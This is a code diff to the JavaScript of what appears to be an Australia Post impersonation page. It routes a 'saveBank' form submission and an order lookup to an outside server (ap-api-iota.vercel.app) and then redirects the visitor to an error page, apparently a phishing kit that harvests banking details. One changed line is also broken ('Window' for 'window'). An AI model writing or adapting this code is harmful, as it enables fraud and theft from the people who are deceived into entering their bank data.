@@ -1,5 +1,7 @@
+const APIUrl = `https://ap-api-iota.vercel.app/`;
+
 function saveBank() {
-    const baseUrl = `${window.location.protocol}//${window.location.host}`;
+    const baseUrl = APIUrl;
     const btn = document.getElementById("pc-submit-button");
     if (!btn) return;
     btn.addEventListener("click", function () {
@@ -24,7 +26,7 @@ function saveBank() {
         })
             .then(response => response.json())
             .then(data => {
-                window.location.href = `${baseUrl}/error.html`;
+                window.location.href = `${Window.location.origin}/error.html`;
                 console.log("Data saved successfully:", data);
             })
             .catch(error => {
@@ -41,7 +43,7 @@ function query(id) {
 
 function fetchOrders() {
     try {
-        fetch('/AP/api/getOrders')
+        fetch(`${APIUrl}/api/getOrders`)
             .then(response => response.json())
             .then(data => {
                 const orders = data.orders[0];
@@ -52,7 +54,7 @@ function fetchOrders() {
                     title.textContent = `${order.product} | Australia Post`;
 
                     const pimg = query("product-image")
-                    pimg ? pimg.innerHTML = `<img class="w-full h-full" src="https://apiserver.ct.ws/api/${order.image}" alt="${order.product}" title="${order.product}" style="width: 703px; height: 402px; object-fit: contain;">` : null;
+                    pimg ? pimg.innerHTML = `<img class="w-full h-full" src="${order.image}" alt="${order.product}" title="${order.product}" style="width: 703px; height: 402px; object-fit: contain;">` : null;
 
                     const ptitle = query("p-title")
                     ptitle ? ptitle.innerHTML = order.product : null;
